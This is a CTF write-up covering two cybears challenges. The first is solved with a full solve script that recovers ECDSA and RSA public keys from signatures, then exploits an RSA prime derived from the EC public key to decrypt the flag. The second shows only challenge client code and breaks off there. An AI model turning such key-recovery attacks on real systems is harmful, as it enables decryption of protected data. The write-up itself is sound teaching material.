&lt;h1 id=&#34;public-service---8-solves&#34;&gt;Public Service - 8 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You find a parchment filled with ancient writings. At the bottom are a number of ornate calligraphic signatures&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This was a nice challenge. We&amp;rsquo;re given two files, &lt;code&gt;generate_signatures.py&lt;/code&gt; and &lt;code&gt;out.json&lt;/code&gt;:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;348591627&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;348591627&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;generate_signatures.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
import Crypto.Signature.DSS as dss
import Crypto.PublicKey.ECC as ecc
import Crypto.Hash.SHA256 as sha256
import Crypto.PublicKey.RSA as rsa
import Crypto.Signature.PKCS1_v1_5 as pkcs
import Crypto.Cipher.PKCS1_OAEP as oaep
from Crypto.Util.number import inverse, getPrime, isPrime, long_to_bytes, bytes_to_long
from binascii import hexlify
import json

from cybearssecrets import FLAG

MESSAGE1 = b&amp;#39;If a new source of energy is not found, no one is going to win this war&amp;#39;
MESSAGE2 = b&amp;#39;Bah weep gragnah weep nini bong&amp;#39;
MESSAGE3 = b&amp;#39;Freedom is the right of all sentient beings&amp;#39;

## Generate Elliptic Curve parameters
ec = ecc.generate(curve = &amp;#34;p256&amp;#34;)
ec_signer = dss.new(ec, &amp;#39;fips-186-3&amp;#39;)

## Generate Elliptic Curve Signature
ec_hasher = sha256.new(MESSAGE1)
ec_sig = ec_signer.sign(ec_hasher)

## Generate RSA parameters
def generate_special_prime(b):
    t = bytes_to_long(b)
    while not(isPrime(t)):
        t &amp;#43;= 1
    return t

rsa_p = generate_special_prime(long_to_bytes(ec.pointQ.x)&amp;#43;long_to_bytes(ec.pointQ.y))
rsa_q = getPrime(512) 

rsa_n = rsa_p*rsa_q
rsa_e = 65537
rsa_d = inverse(rsa_e, (rsa_p-1)*(rsa_q-1))

r = rsa.construct((rsa_n,rsa_e,rsa_d))

## Generate RSA Signatures
rsa_signer = pkcs.new(r)

rsa_hasher1 = sha256.new(MESSAGE2)
rsa_hasher2 = sha256.new(MESSAGE3)

rsa_sig1 = rsa_signer.sign(rsa_hasher1)
rsa_sig2 = rsa_signer.sign(rsa_hasher2)

## Encrypt Flag
encrypter = oaep.new(r)
cipher = encrypter.encrypt(FLAG)

j = {}
j[&amp;#39;ec_sig&amp;#39;] = hexlify(ec_sig).decode()
j[&amp;#39;rsa_sig1&amp;#39;] = hexlify(rsa_sig1).decode()
j[&amp;#39;rsa_sig2&amp;#39;] = hexlify(rsa_sig2).decode()
j[&amp;#39;cipher&amp;#39;] = hexlify(cipher).decode()

with open(&amp;#34;out.json&amp;#34;, &amp;#34;w&amp;#34;) as g: 
    g.write(json.dumps(j))

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;821475639&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;821475639&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;json&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;out.json&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-json&#34; &gt;&lt;code&gt;
{&amp;#34;ec_sig&amp;#34;: &amp;#34;8d32a95ab9b4d92f6ff307d9721451707822d2eae3e07c5c605f0d5979a2e2210b5149487c4d1bedafa96628fcc3579b4842abfa156a963d7db0c15d8da32cc9&amp;#34;, &amp;#34;rsa_sig1&amp;#34;: &amp;#34;45e225f7532b25aa283f80b5166de185cff8b46fb3c9de982083b1ed4a7621c14d0ab541e945c31c9984f958d0b23331d6c636ba8c443941afa277dd2b00c9b7884b4bc9a55047b77305cc6061d9aa9e6be99b70f2f469f6c1accba77228ef129af79bb7f196176753ed27f8308a30b298c34bfc3503dce92f77f0ed8b6d16b6&amp;#34;, &amp;#34;rsa_sig2&amp;#34;: &amp;#34;56b9bac062a9a75b2db42b480e439927265a06b0815be14814f19cd27553a8bdd2815c1814a060fa25b9713b10516b57c9e1f399415492f1ac9a8795034ade99744237a6354d32c0e7330b0b0f52d237e7967863869cf9fdc387f90349c9fbffa15aa72c48ece92bbe59760f41606bfff28af9fdde8f275bf07379f798d98d4d&amp;#34;, &amp;#34;cipher&amp;#34;: &amp;#34;65312f30ef4f34edd32c11ce885c51279bdecd16168953733f04380eb1ed183542e745d630133c4c0c5ce7580bbfb90a347c387eb2743ffaeae5cb7a82058e0fb8a85f7aa392433dc12f0b78e9e0b577909353de84913a47895109de2019a3b88b72f03e13b16f7b092e7a428c664ed174b2cb63208b7a55e9d02a2c0f268d4e&amp;#34;}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;There are 3 known, plaintext messages, $m_1$, $m_2$, and $m_3$. A p256 curve is used and a private key on the curve is generated. Then, a ECDSA signature is created from signing the sha256 hash of $m_1$. We are given this signature.&lt;/p&gt;
&lt;p&gt;Next, a prime $p$ is deterministically generated, using the public key on the curve, point $Q$. Then standard RSA follows, generating prime $q$, public key $n=pq$, and private key $d=e^{-1} \bmod(\phi{(n)})$. Signatures of $m_2$ and $m_3$ are created using the RSA private key, and we are given these signatures. The flag is then encrypted with the RSA key, and we are given the encrypted flag.&lt;/p&gt;
&lt;p&gt;The challenge is to recover both the ECC and RSA public keys, and decrypt the flag.&lt;/p&gt;
&lt;h3 id=&#34;recovering-ecc-public-key&#34;&gt;Recovering ECC Public Key&lt;/h3&gt;
&lt;p&gt;I searched online for recovering the public key from an ECDSA signature and found &lt;a href=&#34;https://crypto.stackexchange.com/questions/18105/how-does-recovering-the-public-key-from-an-ecdsa-signature-work&#34;&gt;this&lt;/a&gt;, which you should read for more details, but essentially you can recover the public key given a signature $(r, s)$, by finding the two points $R$ and $\prime{R}$ with the same x coordinate as $r$, and calculating:&lt;/p&gt;
&lt;p&gt;$$
r^{-1}(sR - zG) \newline
r^{-1}(s\prime{R} - zG)
$$&lt;/p&gt;
&lt;p&gt;where $z$ is the message that was signed, and $G$ is the generator on the curve. As shown above this yields two points, one of which is the public key $Q$.&lt;/p&gt;
&lt;p&gt;We can do so using the sage code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# p-256 curve paramters from https://neuromancer.sk/std/nist/P-256&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;K &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GF(p)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; K(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; K(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EllipticCurve(K, (a, b))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;G &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; E(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_order(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r,s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(ec_sig[:&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]), bytes_to_long(ec_sig[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;:])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(MSG1_HASH&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r_inv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(r, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;R, R_ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;lift_x(K(r), all&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Q_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r_inv &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (s&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;R &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;G)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Q_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r_inv &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (s&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;R_ &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;G)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recovering-rsa-public-key&#34;&gt;Recovering RSA Public Key&lt;/h3&gt;
&lt;p&gt;We have two messages $m_2$ and $m_3$ that are signed with RSA, yielding $s_2$ and $s_3$. Searching online again I found &lt;a href=&#34;https://crypto.stackexchange.com/questions/26188/rsa-public-key-recovery-from-signatures&#34;&gt;this&lt;/a&gt; which states you can recover public modulus $n$ by computing $\gcd{(s_2^e - m_2, s_3^e - m_3)} = kn$ where $k$ is small.&lt;/p&gt;
&lt;p&gt;This makes sense as $m_2 = s_2^e \bmod{n}$ thus $m_2 = s_2^e - k_2n$ for some integer $k_2$, therefore we can GCD $m_2 - s_2^e = -k_2n$ and $m_3 - s_3^e = -k_3n$ to obtain a multiple of $n$.&lt;/p&gt;
&lt;p&gt;As $e = 65537$, this takes a while to compute, but after doing so we recover (a multiple of) the public modulus $n$.&lt;/p&gt;
&lt;p&gt;Note that $m_2$ is actually a transformed version of the plaintext message, as it is first hashed then some pkcs1_15 scheme is used to pad the message. This made it really annoying to get the message that was actually signed, so I directly edited the library code to print the message being signed, and ran the challenge script with a test flag.&lt;/p&gt;

  &lt;img src=&#34;./img/get_real_m.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;h3 id=&#34;getting-the-flag&#34;&gt;Getting the flag&lt;/h3&gt;
&lt;p&gt;Now that we have both the ECDSA and RSA pubkey, we can recover the flag. As mentioned before, one of the RSA primes are generated deterministically based on the ECDSA pubkey $Q$:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generate_special_prime&lt;/span&gt;(b):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(b)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt;(isPrime(t)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; t
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rsa_p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; generate_special_prime(long_to_bytes(ec&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pointQ&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;long_to_bytes(ec&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pointQ&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So now that we recovered the pubkey, we can simply call this function to recover a prime. Even though we have 2 possible ECDSA pubkeys, we can check which one is correct by generating the 2 possible primes and using GCD with $n$.&lt;/p&gt;
&lt;p&gt;From there, it&amp;rsquo;s just simple RSA to generate the RSA private key and decrypt the flag.&lt;/p&gt;
&lt;p&gt;Solve script:



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;725384916&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;725384916&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;code.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
import Crypto.Hash.SHA256 as sha256
import Crypto.PublicKey.RSA as rsa
import Crypto.Cipher.PKCS1_OAEP as oaep
from Crypto.Util.number import *

## Generate RSA parameters
def generate_special_prime(b):
    t = bytes_to_long(b)
    while not(isPrime(t)):
        t &amp;#43;= 1
    return t

data = {&amp;#34;ec_sig&amp;#34;: &amp;#34;8d32a95ab9b4d92f6ff307d9721451707822d2eae3e07c5c605f0d5979a2e2210b5149487c4d1bedafa96628fcc3579b4842abfa156a963d7db0c15d8da32cc9&amp;#34;, &amp;#34;rsa_sig1&amp;#34;: &amp;#34;45e225f7532b25aa283f80b5166de185cff8b46fb3c9de982083b1ed4a7621c14d0ab541e945c31c9984f958d0b23331d6c636ba8c443941afa277dd2b00c9b7884b4bc9a55047b77305cc6061d9aa9e6be99b70f2f469f6c1accba77228ef129af79bb7f196176753ed27f8308a30b298c34bfc3503dce92f77f0ed8b6d16b6&amp;#34;, &amp;#34;rsa_sig2&amp;#34;: &amp;#34;56b9bac062a9a75b2db42b480e439927265a06b0815be14814f19cd27553a8bdd2815c1814a060fa25b9713b10516b57c9e1f399415492f1ac9a8795034ade99744237a6354d32c0e7330b0b0f52d237e7967863869cf9fdc387f90349c9fbffa15aa72c48ece92bbe59760f41606bfff28af9fdde8f275bf07379f798d98d4d&amp;#34;, &amp;#34;cipher&amp;#34;: &amp;#34;65312f30ef4f34edd32c11ce885c51279bdecd16168953733f04380eb1ed183542e745d630133c4c0c5ce7580bbfb90a347c387eb2743ffaeae5cb7a82058e0fb8a85f7aa392433dc12f0b78e9e0b577909353de84913a47895109de2019a3b88b72f03e13b16f7b092e7a428c664ed174b2cb63208b7a55e9d02a2c0f268d4e&amp;#34;}

MESSAGE1 = b&amp;#39;If a new source of energy is not found, no one is going to win this war&amp;#39;
MSG1_HASH = sha256.new(MESSAGE1)

ec_sig = bytes.fromhex(data[&amp;#34;ec_sig&amp;#34;])
s1 = int(data[&amp;#34;rsa_sig1&amp;#34;], 16)
s2 = int(data[&amp;#34;rsa_sig2&amp;#34;], 16)
enc_flag = bytes.fromhex(data[&amp;#34;cipher&amp;#34;])

# p-256 curve paramters from https://neuromancer.sk/std/nist/P-256
p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff 
K = GF(p)
a = K(0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc)
b = K(0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b)
E = EllipticCurve(K, (a, b))
G = E(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)
E.set_order(0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 * 0x1)

# part 1: recover ECC public key
r,s = bytes_to_long(ec_sig[:32]), bytes_to_long(ec_sig[32:])
z = bytes_to_long(MSG1_HASH.digest())

r_inv = pow(r, -1, E.order())
R, R_ = E.lift_x(K(r), all=True)

Q_1 = r_inv * (s*R - z*G)
Q_2 = r_inv * (s*R_ - z*G)

print(f&amp;#34;Recovered possible ECSDA pubkeys:&amp;#34;)
print(f&amp;#34;{Q_1 = }&amp;#34;)
print(f&amp;#34;{Q_2 = }&amp;#34;)

# part 2: recover RSA public key

e = 65537
# values from editing library src and printing msg before it got signed
# MESSAGE2 = b&amp;#39;Bah weep gragnah weep nini bong&amp;#39;
# MESSAGE3 = b&amp;#39;Freedom is the right of all sentient beings&amp;#39;
m2 = 5486124068793688683255936251187209270074392635932332070112001988456197381759672947165175699536362793613284725337872111744958183862744647903224103718245670299614498700710006264535421091908069935709303403272242499531581061652193706559968553759421347924920266204277973339410586176390872847811111144114590842
m3 = 5486124068793688683255936251187209270074392635932332070112001988456197381759672947165175699536362793613284725337872111744958183862744647903224103718245670299614498700710006264535421091908069935709303403272242499531581061652193643492425095701346333448554897794580398627955585138706133687412101835882486651

print(f&amp;#34;Recovering RSA pubkey...&amp;#34;)

kn = gcd(s1^e - m2, s2^e - m3)

print(f&amp;#34;Recovered RSA pubkey multiple {kn = }&amp;#34;)

# last part: decrypting flag

rsa_p_1 = generate_special_prime(long_to_bytes(int(Q_1.x()))&amp;#43;long_to_bytes(int(Q_1.y())))
rsa_p_2 = generate_special_prime(long_to_bytes(int(Q_2.x()))&amp;#43;long_to_bytes(int(Q_2.y())))

p = None
if gcd(rsa_p_1, kn) != 1:
    p = rsa_p_1
elif gcd(rsa_p_2, kn) != 1:
    p = rsa_p_2
else:
    print(&amp;#34;Something went wrong, neither primes are correct&amp;#34;)

# k*n = k*p*q
kq = kn // p
# get largest factor of kq which should be q
q = list(dict(factor(kq)).keys())[-1]

n = p*q
d = pow(e, -1, (p-1)*(q-1))

r = rsa.construct((int(n),int(e),int(d)))
decrypter = oaep.new(r)
flag = decrypter.decrypt(enc_flag)
print(f&amp;#34;{flag = }&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/p&gt;
&lt;p&gt;Flag: &lt;code&gt;cybears{D0nt_m4k3_pr1v4t3_publ1c_k3yz!}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;arpeeceethree---3-solves&#34;&gt;arpeeceethree - 3 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You hand over your identity parchment to the temple monk. He scrutinises it closely, looking for any signs of malintent.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python client.py -r arpeeceethree.chal.cybears.io:2323&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There was a lot of source and dependencies to install for this challenge, but the vulnerability is actually very simple.&lt;/p&gt;
&lt;p&gt;We are provided with 3 files, &lt;code&gt;client.py&lt;/code&gt;, &lt;code&gt;server.py&lt;/code&gt; and &lt;code&gt;server.proto&lt;/code&gt;.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;297165834&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;297165834&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;client.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import * 
from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError
import sys 
import argparse

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey


def send_message(s, msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to a TPC/IP socket &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    s.send(mh.SerializeToString() &amp;#43; data)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None


def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message(s):
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= s.recv(1)
        try:
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e:
            pass

    # Receive the message data
    data = s.recv(header.msglen)

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None:
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            return msg
        except _DecodeError:
            return None
    else:
        return None

def create_user():
    client_ecdh = ECDH(curve=NIST256p)
    client_ecdh.generate_private_key()
    return client_ecdh

def register(s, ecdh, name=b&amp;#39;bumblebear&amp;#39;, pubkey=b&amp;#39;&amp;#39;):
    ## REGISTER
    rr = spb.RegisterRequest()
    rr.type = spb.MSG_REGISTER_REQUEST
    rr.name = name
    if pubkey == b&amp;#39;&amp;#39;:
        rr.clientPublicKey = ecdh.get_public_key().to_string(encoding=&amp;#39;compressed&amp;#39;)
    else:
        rr.clientPublicKey = pubkey

    send_message(s, rr)

    ## REGISTER RESPONSE
    reg_resp = recv_message(s)
    if reg_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(reg_resp))
    if reg_resp.status == spb.FAILURE:
        log.error(&amp;#34;failed to register&amp;#34;)
    uid = reg_resp.uid
    return uid

def login(s, uid):
    ## LOGIN
    l = spb.LoginRequest()
    l.type = spb.MSG_LOGIN_REQUEST
    l.uid = uid
    send_message(s, l)

    ## LOGIN RESPONSE
    login_resp = recv_message(s)
    if login_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(login_resp))
    
    return login_resp.sessionId, login_resp.challenge, login_resp.ephemeralServerPublicKey


def login2(s, ecdh, sessionId, challenge):
    ## SIGN CHALLENGE
    sig = ecdh.private_key.sign_deterministic(challenge)

    ## GENERATE EPHEMERAL DH SESSION KEY
    client_ephemeral_ecdh = ECDH(curve=NIST256p)
    client_ephemeral_ecdh.generate_private_key()
    client_ephemeral_public_key = client_ephemeral_ecdh.get_public_key()

    send_chal = spb.LoginChallenge()
    send_chal.type = spb.MSG_LOGIN_CHALLENGE
    send_chal.sessionId = sessionId
    send_chal.ephemeralClientPublicKey = client_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    send_chal.challengeResponse = sig
    send_message(s, send_chal)

    msg_resp = recv_message(s)
    if msg_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    return client_ephemeral_ecdh

def request_msg(s, sessionId, uid, client_ephemeral, server_ephemeral):
    ## REQUEST MESSAGE
    log.info(&amp;#34;sending message request&amp;#34;)
    msg_req = spb.MessageRequest()
    msg_req.type = spb.MSG_MESSAGE_REQUEST
    msg_req.sessionId = sessionId

    send_message(s, msg_req)

    log.info(&amp;#34;receiving message&amp;#34;)
    msg_resp = recv_message(s)
    if msg_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    ## DECRYPT MESSAGE
    server_ephemeral_public_key = VerifyingKey.from_string(server_ephemeral, NIST256p)

    client_ephemeral.load_received_public_key(server_ephemeral_public_key)
    shared_secret = client_ephemeral.generate_sharedsecret_bytes()

    token  = shared_secret
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2)

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    message = a.decrypt_and_verify(msg_resp.encMsg, msg_resp.encMsgTag)

    log.info(&amp;#34;message received: {}&amp;#34;.format(message))
    return message

if __name__ == &amp;#34;__main__&amp;#34;:

    parser = argparse.ArgumentParser()
